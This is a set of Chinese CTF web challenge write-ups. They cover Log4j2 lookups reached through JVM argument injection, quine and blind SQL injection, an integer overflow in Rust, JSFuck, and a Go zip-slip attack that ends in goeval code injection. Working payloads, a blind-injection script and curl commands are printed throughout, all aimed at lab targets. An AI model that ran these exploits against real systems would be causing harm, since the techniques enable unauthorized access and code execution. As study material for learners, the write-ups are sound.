# 0x01 Mini V&N CTF【chatrobot】
给了源码，主要文件有两个：
1. `target/chatrobot-1.0-SNAPSHOT.jar!\com\ctf\chatrobot\App.class`
2. `src/app.py`
```python
# app.py
import os
import subprocess
from flask import request, render_template, Flask
import os
import subprocess
from flask import request, render_template, Flask

app = Flask(__name__)


JAVA_JAR_PATH = 'target/chatrobot-1.0-SNAPSHOT.jar'

@app.route("/", methods=['GET', 'POST'])
def start():
    if request.method == 'POST':
        text_input = request.form.get('text', '').strip()
        if not text_input:
             return ('invalid message', 400)
        
        parts = text_input.split(' ', 1)
        cmd = parts[0]
        text = parts[1] if len(parts) > 1 else ''
        
        result = chat(cmd, text)
        return result.get('stdout', '') + result.get('stderr', '')
        
    return render_template('index.html')

@app.route("/chat", methods=['GET'])
def handle_chat_api():
    cmd = request.args.get('cmd', '').strip()
    arg = request.args.get('arg', '').strip()
    
    if not cmd:
        return ('invalid command', 400)

    result = chat(cmd, arg)
    
    out = result.get('stdout', '').strip()
    err = result.get('stderr', '').strip()

    return out 


def chat(cmd, text):
    env = os.environ.copy()
    env['FLAG'] = env['INSERT_FLAG']
    java_command = [
        'java',
        '-Xms48M',
        '-Xmx96M',
        f'-Dcmd={cmd}', 
        '-jar',
        JAVA_JAR_PATH, 
        text
    ]

    try:
        res = subprocess.run(
            java_command, 
            capture_output=True, 
            timeout=45,
            env=env, 
            check=False 
        )


        stdout_text = res.stdout.decode('utf8', errors='replace')
        stderr_text = res.stderr.decode('utf8', errors='replace')

        return {
            'stdout': stdout_text,
            'stderr': stderr_text,
        }
    except subprocess.TimeoutExpired:
        return {
            'stdout': '喵呜！机器人跑太慢了，超时了啦 QAQ',
            'stderr': ''
        }
    except FileNotFoundError:
        return {
            'stdout': '喵？Java 或 JAR 文件找不到喵。',
            'stderr': ''
        }

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
```

```java
# App.class
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package com.ctf.chatrobot;

import java.time.LocalDateTime;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class App {
    public static Logger LOGGER = LogManager.getLogger(App.class);

    public static void main(String[] args) {
        String flag = System.getenv("FLAG");
        if (flag == null) {
            LOGGER.error("{}", "欸？flag去哪了喵(。_。)");
        }

        LOGGER.info("msg: {}", args);
        String cmd = System.getProperty("cmd");
        if (cmd != null && !cmd.equals("help")) {
            if (!cmd.startsWith("/")) {
                System.out.println("都说了用/开头了啊喂，你这个大笨蛋喵(╯▔皿▔)╯");
            } else {
                doCommand(cmd.substring(1), args);
            }
        } else {
            doHelp();
        }
    }

    private static void doCommand(String cmd, String[] arg) {
        String argText = arg.length > 0 ? arg[0] : "";
        switch (cmd) {
            case "help":
                doHelp();
                break;
            case "spawnpoint":
                if (argText.isEmpty()) {
                    System.out.println("喵？你想把重生点定在哪儿？格式：/spawnpoint <坐标/地点>");
                } else {
                    System.out.println("重生点已设定在: " + argText);
                }
                break;
            case "time":
                System.out.println(LocalDateTime.now().toString());
                break;
            case "weather":
                if (argText.trim().isEmpty()) {
                    String effect = "";
                    String response = "今天天气不错喵";
                } else {
                    String response;
                    String effect;
                    switch (argText.trim().toLowerCase()) {
                        case "sun":
                            effect = "[WEATHER_SUN]";
                            response = "今天天气不错喵";
                            break;
                        case "rain":
                            effect = "[WEATHER_RAIN]";
                            response = "听说下雨和巧克力更配喵";
                            break;
                        case "snow":
                            effect = "[WEATHER_SNOW]";
                            response = "又到了白色相簿的季节喵";
                            break;
                        default:
                            effect = "";
                            response = "喵？这个天气我不认识！试试 rain/snow/sun 喵";
                    }

                    System.out.println(effect + " " + response);
                }
                break;
            default:
                System.out.println("都说了好感度不够了啦╮(￣⊿￣)╭");
        }

    }

    private static void doHelp() {
        System.out.println("目前好感度不够喵，只能设置重生点（/spawnpoint），查看时间（/time），设置天气（/weather rain/snow/sun）");
    }
}
```
审计源码后我们知道了大致的业务流程：
1. python的路由接受用户的输入后进行一些拆分处理为参数
2. 调用chat()方法把用户的输入拼接到了java程序的编译命令参数中
3. 由java处理后端逻辑
chat()方法关键部分：
```python
def chat(cmd, text):
    env = os.environ.copy()
    env['FLAG'] = env['INSERT_FLAG']
    java_command = [
        'java',
        '-Xms48M',
        '-Xmx96M',
        f'-Dcmd={cmd}', 
        '-jar',
        JAVA_JAR_PATH, 
        text
    ]

    try:
        res = subprocess.run(
            java_command, 
            capture_output=True, 
            timeout=45,
            env=env, 
            check=False 
        )

```
`f'-Dcmd={cmd}'`把用户输入直接拼接到了参数中。
所以这里我们就可以去注入参数了
比如我们构造
```bash
'-Dcmd = /weather-Dlog4j2.formatMsgNoLookups=false-Dlog4j2.layout.pattern=${env:FLAG}'
#此时jvm解析后就是
java_command = [
    'java',
    '-Xms48M',
    '-Xmx96M',
    '-Dcmd=/weather',
    '-Dlog4j2.formatMsgNoLookups=false',
    '-Dlog4j2.layout.pattern=${env:FLAG}',
    '-jar',
    JAVA_JAR_PATH,
    text
]

```
后面的就被当作参数注入了
然后解释一下这两个参数：

首先`-D`开头的是`JVM系统参数
然后这两条都是属于`jog4j2`的专属系统参数

* ==-Dlog4j2.formatMsgNoLookups=false==
1. 这条参数是控制 **Log4j2 是否对日志消息中的 `${}` 做 Lookup 解析**。
2. 在`Log4j2 2.15+`的版本中这个值默认是`ture`表示不会解析该语法
3. 现在我们显示开启解析

* ==-Dlog4j2.layout.pattern=${env:FLAG}==
1. 这条参数是直接指定 Log4j2 使用的 **PatternLayout 模板**。
2. `${env:FLAG}`就是lookup语法，表示输出环境变量中的flag

这里为什么会输出日志，是因为后端java代码中有
```java
    LOGGER.info("msg: {}", args);
```
这句就是打印一次日志信息，原本是要打印`("msg: {}", args)`,但是由于我们注入的第二个参数
日志格式被替换了，所以可以输出flag。
## payload
所以最后payload：
```bash
┌──(root💀JYli)-[~]
└─# curl -X POST  http://challenge.ilovectf.cn:30295/  -d "text=/weather-Dlog4j2.formatMsgNoLookups=false-Dlog4j2.layout.pattern=\${env:FLAG} "   
都说了好感度不够了啦╮(￣⊿￣)╭
08:21:37.550 INFO  com.ctf.chatrobot.App executing /weather-Dlog4j2.formatMsgNoLookups=false-Dlog4j2.layout.pattern=VNCTF{LO6_10r_J_1s_1UN_N8jqBDO} - msg:  
```

## 一点疑惑
最后有点疑惑是为什么不能打`/chat`路由，试了一下日志都不能回显
```bash
┌──(root💀JYli)-[~]
└─# curl  http://challenge.ilovectf.cn:30295/chat\?cmd=/weather-Dlog4j2.formatMsgNoLookups=false-Dlog4j2.layout.pattern=\${env:FLAG}         
都说了好感度不够了啦╮(￣⊿￣)╭#    
```
好像是因为`/chat`路由：
```python
result = chat(cmd, arg)

out = result.get('stdout', '').strip()
    err = result.get('stderr', '').strip()

    return out 
```
而`/`路由：
```python
result = chat(cmd, text)
        return result.get('stdout', '') + result.get('stderr', '')
```
而有一个规则是
```java
LOGGER.info(...)  →  stderr
System.out.println(...) → stdout
```
所以我们这里打`/`路由
#  0x02 第五空间 2021【yet_another_mysql_injection】（quine注入）

`?source`拿到源代码：
```php
<?php
include_once("lib.php");
function alertMes($mes,$url){
    die("<script>alert('{$mes}');location.href='{$url}';</script>");
}

function checkSql($s) {
    if(preg_match("/regexp|between|in|flag|=|>|<|and|\||right|left|reverse|update|extractvalue|floor|substr|&|;|\\\$|0x|sleep|\ /i",$s)){
        alertMes('hacker', 'index.php');
    }
}

if (isset($_POST['username']) && $_POST['username'] != '' && isset($_POST['password']) && $_POST['password'] != '') {
    $username=$_POST['username'];
    $password=$_POST['password'];
    if ($username !== 'admin') {
        alertMes('only admin can login', 'index.php');
    }
    checkSql($password);
    $sql="SELECT password FROM users WHERE username='admin' and password='$password';";
    $user_result=mysqli_query($con,$sql);
    $row = mysqli_fetch_array($user_result);
    if (!$row) {
        alertMes("something wrong",'index.php');
    }
    if ($row['password'] === $password) {
        die($FLAG);
    } else {
    alertMes("wrong password",'index.php');
  }
}

if(isset($_GET['source'])){
  show_source(__FILE__);
  die;
}
?>
<!-- /?source -->
<html>
    <body>
        <form action="/index.php" method="post">
            <input type="text" name="username" placeholder="账号"><br/>
            <input type="password" name="password" placeholder="密码"><br/>
            <input type="submit" / value="登录">
        </form>
    </body>
</html>
```
就是简单的账号密码，账号为`admin`,密码是从数据库查询的密码
```sql
SELECT password FROM users WHERE username='admin' and password='$password';
```
会执行这条语句，其中`$password`是我们控制的。
这里按理来说其实是可以打盲注的。但是这里我们打Quine注入更简单，因为如果让查询结果等于输入，那我们的条件不久永真了吗，
这里有脚本
```python
sql = input ("输入你的sql语句,不用写关键查询的信息  形如 1'union select #\n")
sql2 = sql.replace("'",'"')
base = "replace(replace('.',char(34),char(39)),char(46),'.')"
final = ""
def add(string):
    if ("--+" in string):
        tem = string.split("--+")[0] + base + "--+"
    if ("#" in string):
        tem = string.split("#")[0] + base + "#"
    return tem
def patch(string,sql):
    if ("--+" in string):
        return sql.split("--+")[0] + string + "--+"
    if ("#" in string):
        return sql.split("#")[0] + string + "#"

res = patch(base.replace(".",add(sql2)),sql).replace(" ","/**/").replace("'.'",'"."')

print(res)
```
![](assets/Quine注入/file-20251217195614491.png)
就帮我们构造好了（-1后面有个`'`我忘记了）
![500](assets/Quine注入/file-20251217200038962.png)
输入就出了

# 0x03 第五空间 2021【yet_another_mysql_injection】（sql盲注）
这题同样可以使用盲注，但是效率比较低
脚本：
```python
import requests  
import string  
  
url = "http://node4.anna.nssctf.cn:28961/"   # 改成你的目标  
charset = string.ascii_letters + string.digits + "_{}-"  
max_len = 64  
  
def check(payload):  
    data = {  
        "username": "admin",  
        "password": payload  
    }  
    r = requests.post(url, data=data)  
    return "something wrong" not in r.text  
  
password = ""  
  
for pos in range(1, max_len + 1):  
    found = False  
    for ch in charset:  
        payload = f"'/**/or/**/!strcmp(mid(password,{pos},1),'{ch}')#"  
        if check(payload):  
            password += ch  
            print(f"[+] pos {pos}: {ch}")  
            found = True  
            break    if not found:  
        print("[*] password end")  
        break  
  
print("[+] password =", password)
```
原理就是查询成功的话，就算密码错了也会回显`wrong password`，而如果我们or后面的为假导致查询失败的话，会回显`something wrong`，
我们利用回显是不是`something wron`判断是否成功。
这里`=`号被禁用的话就用`strcmp()`比较，相等会返回0不相等返回非0，所以这里取！
![500](assets/Day%201/file-20251217201303468.png)
最后成功盲注到密码，输入进去也可以得到flag
# 0x04 VNCTF2023【电子木鱼】
给了源码，是Rust语言写的一个功德计算的程序，功德大于十亿得到flag
`/upgrade`路由通过传入的`body.name`变量对`GONGDE`进行各种操作，`PAYLOADS`数组变量包含五个不同的Payload结构体，`name`分别对应不同的操作
主要源码：
```rust
const PAYLOADS: &[Payload] = &[
    Payload {
        name: "Cost",
        cost: 10,
    },
    Payload {
        name: "Loan",
        cost: -1_000,
    },
    Payload {
        name: "CCCCCost",
        cost: 500,
    },
    Payload {
        name: "Donate",
        cost: 1,
    },
    Payload {
        name: "Sleep",
        cost: 0,
    },
];
 
#[post("/upgrade")]
async fn upgrade(body: web::Form<Info>) -> Json<APIResult> {
    if GONGDE.get() < 0 {
        return web::Json(APIResult {
            success: false,
            message: "功德都搞成负数了，佛祖对你很失望",
        });
    }
 
    if body.quantity <= 0 {
        return web::Json(APIResult {
            success: false,
            message: "佛祖面前都敢作弊，真不怕遭报应啊",
        });
    }
 
    if let Some(payload) = PAYLOADS.iter().find(|u| u.name == body.name) {
        let mut cost = payload.cost;
 
        if payload.name == "Donate" || payload.name == "Cost" {
            cost *= body.quantity;
        }
 
        if GONGDE.get() < cost as i32 {
            return web::Json(APIResult {
                success: false,
                message: "功德不足",
            });
        }
 
        if cost != 0 {
            GONGDE.set(GONGDE.get() - cost as i32);
        }
 
...
 
        }
    }
 
    web::Json(APIResult {
        success: false,
        message: "禁止开摆",
    })
}
```
存在漏洞的主要是这里：
```rust
if GONGDE.get() < cost as i32 {
            return web::Json(APIResult {
                success: false,
                message: "功德不足",
            });
        }
```
如果`cost`变量能够为负数，那么就能够加`GONGDE`，但问题是后端对传入的`body.quantity`进行了校验，而Rust作为一种安全性较高的语言，又很难绕过校验。

注意到后端对`cost`的数值类型限定为32位int，那么就有可能存在整型溢出漏洞。如果直接传入`2147483648`后端会报错。但由于cost进行了乘法操作`cost *= body.quantity;`，当`body.name=Cost`时，`cost`变量默认为`10`，因此我们传入`body.quantity=214748365`，乘法操作后cost就会变为`2147483650`，int32下会溢出为负数。
`（i32 能表示的最大值是2 147 483 647）`

通过这段代码扣钱：
```rust
if cost != 0 {

            GONGDE.set(GONGDE.get() - cost as i32);

        }
```
只要cost为一个很大的负数，我们就可以给GONGDE加很多了。所以才需要对整数溢出，`rust`中对超过最大值的数会从负的最大值开始`'环绕'` .也就是`2147483648`会等于`-2147483648`。因为int32：`最大：2147483647 最小：-2147483648`。
payload:
`post传：name=Cost&quantity=214748365`.
# 0x05 VNCTF2023【象棋王子】
翻一下js文件，发现fuckjs代码：
![](assets/VNCTF%20%202023%20web%20复现/file-20251203193025605.png)
到控制台执行
![500](assets/VNCTF%20%202023%20web%20复现/file-20251203193025617.png)
#  0x06 VNCTF2023【BabyGo】
给了附件，是go语言源码，看不太懂就叫ai分析了。
```go
package main

import (
	"encoding/gob"
	"fmt"
	"github.com/PaulXu-cn/goeval"
	"github.com/duke-git/lancet/cryptor"
	"github.com/duke-git/lancet/fileutil"
	"github.com/duke-git/lancet/random"
	"github.com/gin-contrib/sessions"
	"github.com/gin-contrib/sessions/cookie"
	"github.com/gin-gonic/gin"
	"net/http"
	"os"
	"path/filepath"
	"strings"
)

type User struct {
	Name  string
	Path  string
	Power string
}

func main() {
	r := gin.Default()
	store := cookie.NewStore(random.RandBytes(16))
	r.Use(sessions.Sessions("session", store))
	r.LoadHTMLGlob("template/*")

	r.GET("/", func(c *gin.Context) {
		userDir := "/tmp/" + cryptor.Md5String(c.ClientIP()+"VNCTF2023GoGoGo~") + "/"
		session := sessions.Default(c)
		session.Set("shallow", userDir)
		session.Save()
		fileutil.CreateDir(userDir)
		gobFile, _ := os.Create(userDir + "user.gob")
		user := User{Name: "ctfer", Path: userDir, Power: "low"}
		encoder := gob.NewEncoder(gobFile)
		encoder.Encode(user)
		if fileutil.IsExist(userDir) && fileutil.IsExist(userDir+"user.gob") {
			c.HTML(200, "index.html", gin.H{"message": "Your path: " + userDir})
			return
		}
		c.HTML(500, "index.html", gin.H{"message": "failed to make user dir"})
	})

	r.GET("/upload", func(c *gin.Context) {
		c.HTML(200, "upload.html", gin.H{"message": "upload me!"})
	})

	r.POST("/upload", func(c *gin.Context) {
		session := sessions.Default(c)
		if session.Get("shallow") == nil {
			c.Redirect(http.StatusFound, "/")
		}
		userUploadDir := session.Get("shallow").(string) + "uploads/"
		fileutil.CreateDir(userUploadDir)
		file, err := c.FormFile("file")
		if err != nil {
			c.HTML(500, "upload.html", gin.H{"message": "no file upload"})
			return
		}
		ext := file.Filename[strings.LastIndex(file.Filename, "."):]
		if ext == ".gob" || ext == ".go" {
			c.HTML(500, "upload.html", gin.H{"message": "Hacker!"})
			return
		}
		filename := userUploadDir + file.Filename
		if fileutil.IsExist(filename) {
			fileutil.RemoveFile(filename)
		}
		err = c.SaveUploadedFile(file, filename)
		if err != nil {
			c.HTML(500, "upload.html", gin.H{"message": "failed to save file"})
			return
		}
		c.HTML(200, "upload.html", gin.H{"message": "file saved to " + filename})
	})

	r.GET("/unzip", func(c *gin.Context) {
		session := sessions.Default(c)
		if session.Get("shallow") == nil {
			c.Redirect(http.StatusFound, "/")
		}
		userUploadDir := session.Get("shallow").(string) + "uploads/"
		files, _ := fileutil.ListFileNames(userUploadDir)
		destPath := filepath.Clean(userUploadDir + c.Query("path"))
		for _, file := range files {
			if fileutil.MiMeType(userUploadDir+file) == "application/zip" {
				err := fileutil.UnZip(userUploadDir+file, destPath)
				if err != nil {
					c.HTML(200, "zip.html", gin.H{"message": "failed to unzip file"})
					return
				}
				fileutil.RemoveFile(userUploadDir + file)
			}
		}
		c.HTML(200, "zip.html", gin.H{"message": "success unzip"})
	})

	r.GET("/backdoor", func(c *gin.Context) {
		session := sessions.Default(c)
		if session.Get("shallow") == nil {
			c.Redirect(http.StatusFound, "/")
		}
		userDir := session.Get("shallow").(string)
		if fileutil.IsExist(userDir + "user.gob") {
			file, _ := os.Open(userDir + "user.gob")
			decoder := gob.NewDecoder(file)
			var ctfer User
			decoder.Decode(&ctfer)
			if ctfer.Power == "admin" {
				eval, err := goeval.Eval("", "fmt.Println(\"Good\")", c.DefaultQuery("pkg", "fmt"))
				if err != nil {
					fmt.Println(err)
				}
				c.HTML(200, "backdoor.html", gin.H{"message": string(eval)})
				return
			} else {
				c.HTML(200, "backdoor.html", gin.H{"message": "low power"})
				return
			}
		} else {
			c.HTML(500, "backdoor.html", gin.H{"message": "no such user gob"})
			return
		}
	})

	r.Run(":80")
}

```
一共有五个路由(包括`/uploads`)
## 代码分析
`/ `路由：
```go
r.GET("/", func(c *gin.Context) {
		userDir := "/tmp/" + cryptor.Md5String(c.ClientIP()+"VNCTF2023GoGoGo~") + "/"
		session := sessions.Default(c)
		session.Set("shallow", userDir)
		session.Save()
		fileutil.CreateDir(userDir)
		gobFile, _ := os.Create(userDir + "user.gob")
		user := User{Name: "ctfer", Path: userDir, Power: "low"}
		encoder := gob.NewEncoder(gobFile)
		encoder.Encode(user)
		if fileutil.IsExist(userDir) && fileutil.IsExist(userDir+"user.gob") {
			c.HTML(200, "index.html", gin.H{"message": "Your path: " + userDir})
			return
		}
		c.HTML(500, "index.html", gin.H{"message": "failed to make user dir"})
	})
```
* md5加ip，设置了一段临时的用户目录
* 写入了初始的`user.gob`,`User{Name: "ctfer", Path: userDir, Power: "low"}`
`/upload` 路由
```go
r.GET("/upload", func(c *gin.Context) { ... })

r.POST("/upload", func(c *gin.Context) {
    session := sessions.Default(c)
    if session.Get("shallow") == nil {
        c.Redirect(http.StatusFound, "/")
    }
    userUploadDir := session.Get("shallow").(string) + "uploads/"
    fileutil.CreateDir(userUploadDir)
    file, err := c.FormFile("file")
    if err != nil {
        c.HTML(500, "upload.html", gin.H{"message": "no file upload"})
        return
    }
    ext := file.Filename[strings.LastIndex(file.Filename, "."):]
    if ext == ".gob" || ext == ".go" {
        c.HTML(500, "upload.html", gin.H{"message": "Hacker!"})
        return
    }
    filename := userUploadDir + file.Filename
    if fileutil.IsExist(filename) {
        fileutil.RemoveFile(filename)
    }
    err = c.SaveUploadedFile(file, filename)
    if err != nil {
        c.HTML(500, "upload.html", gin.H{"message": "failed to save file"})
        return
    }
    c.HTML(200, "upload.html", gin.H{"message": "file saved to " + filename})
})

```
* 用户上传文件，保存在 `.../uploads/`。禁止 `.gob` 和 `.go` 扩展名的直接上传。
`/unzip` 路由
```go
r.GET("/unzip", func(c *gin.Context) {
		session := sessions.Default(c)
		if session.Get("shallow") == nil {
			c.Redirect(http.StatusFound, "/")
		}
		userUploadDir := session.Get("shallow").(string) + "uploads/"
		files, _ := fileutil.ListFileNames(userUploadDir)
		destPath := filepath.Clean(userUploadDir + c.Query("path"))
		for _, file := range files {
			if fileutil.MiMeType(userUploadDir+file) == "application/zip" {
				err := fileutil.UnZip(userUploadDir+file, destPath)
				if err != nil {
					c.HTML(200, "zip.html", gin.H{"message": "failed to unzip file"})
					return
				}
				fileutil.RemoveFile(userUploadDir + file)
			}
		}
		c.HTML(200, "zip.html", gin.H{"message": "success unzip"})
	})
```
* 只有登录 Session 才能继续。
*  读取当前用户的上传目录 `/tmp/<hash>/uploads/`
- 找到所有 MIME 为 zip 的文件
- 读取 URL 参数 `path`，构造解压目标路径：
	`destPath = Clean(uploadDir + path)`
- 对每个 zip 文件执行解压到 destPath
- 解压完成后把 zip 删除
`/backdoor` 路由
```go
r.GET("/backdoor", func(c *gin.Context) {
    session := sessions.Default(c)
    if session.Get("shallow") == nil {
        c.Redirect(http.StatusFound, "/")
    }
    userDir := session.Get("shallow").(string)
    if fileutil.IsExist(userDir + "user.gob") {
        file, _ := os.Open(userDir + "user.gob")
        decoder := gob.NewDecoder(file)
        var ctfer User
        decoder.Decode(&ctfer)
        if ctfer.Power == "admin" {
            eval, err := goeval.Eval("", "fmt.Println(\"Good\")", c.DefaultQuery("pkg", "fmt"))
            if err != nil {
                fmt.Println(err)
            }
            c.HTML(200, "backdoor.html", gin.H{"message": string(eval)})
            return
        } else {
            c.HTML(200, "backdoor.html", gin.H{"message": "low power"})
            return
        }
    } else {
        c.HTML(500, "backdoor.html", gin.H{"message": "no such user gob"})
        return
    }
})

```
* 这里就是会反序列化 `user.gob文件`

## 漏洞分析
* 我们把路由都分析一遍后就有一条攻击思路了。一开始的`user.gob`文件中的`Power="low"`,但是我们可以上传文件，那我们就像是不是可以手动伪造一个`user.gob`文件，改成`Power="admin"`呢。

* 因为我们注意到这里
```go
if ctfer.Power == "admin" {
            eval, err := goeval.Eval("", "fmt.Println(\"Good\")", c.DefaultQuery("pkg", "fmt"))
            if err != nil {
                fmt.Println(err)
            }
            c.HTML(200, "backdoor.html", gin.H{"message": string(eval)})
            return
        }
```
只要`Powe="admin"`,我们就可以eval执行命令了。

* 但是文件上传页面是禁止我们上传`.gob`文件的，此时我们想到还有一个`/unzip`路由。可以把`/uploads`下的`zip`文件解压到我们指定的目录。其实他是会解压到`/uploads`目录下的，但是我们可以目录穿越,`path=../`。来指定目录。这样我们就能将`user.gob`文件覆盖了。
## 攻击
1. 制作zip压缩包
首先我们根据源码写生成`user.gob`文件的脚本。
```go
	package main
 
import (
	"encoding/gob"
	"github.com/duke-git/lancet/fileutil"
	"os"
)
 
type User struct {
	Name  string
	Path  string
	Power string
}
 
func main()  {
	userDir := "./serial/"
	fileutil.CreateDir(userDir)
	gobFile, _ := os.Create(userDir + "user.gob")
	user := User{Name: "ctfer", Path: userDir, Power: "admin"}
	encoder := gob.NewEncoder(gobFile)
	encoder.Encode(user)
 
}
	```
   
这里要下载一些模块什么的就叫ai帮忙了，总之运行脚本会得到一个文件。

![](assets/VNCTF%20%202023%20web%20复现/file-20251205162925828.png)
（这里面的`zip`包是后来手动打包的）

2. 文件上传 
我们来到`/upload`路由。
上传我们的zip
![](assets/VNCTF%20%202023%20web%20复现/file-20251205163137388.png)
3. 解压缩文件
访问`/unzip`路由，path路径指定`../`上级目录。
注意这里一开始没有指定path路径的话会默认解压到`/uploads`目录下，此时还会吧zip删除。所以第一次没操作好需要重新上传。
![](assets/VNCTF%20%202023%20web%20复现/file-20251205163454802.png)
4. 访问反序列化路由
![](assets/VNCTF%20%202023%20web%20复现/file-20251205163525736.png)
显示good说明覆盖成功。
5. 命令执行
这里我没怎么懂，但是就是很复杂的命令拼接，因为会把`/backdoor`路由下的`?pkg`参数拼接到命令执行函数中。
答案是：
```
"os/exec" fmt" )

func init(){ cmd:=exec.Command("cat","/ffflllaaaggg") out,_:=cmd.CombinedOutput() fmt.Println(string(out)) }

var(a="1
```
把这段url编码后传入。
```http
?pkg=%22os%2Fexec%22%0A%20fmt%22%0A%29%0A%0Afunc%09init()%7B%0Acmd%3A%3Dexec.Command(%22cat%22%2C%22%2Fffflllaaaggg%22)%0Aout%2C_%3A%3Dcmd.CombinedOutput()%0Afmt.Println(string(out))%0A%7D%0A%0Avar(a%3D%221
```
![](assets/VNCTF%20%202023%20web%20复现/file-20251205163820848.png)

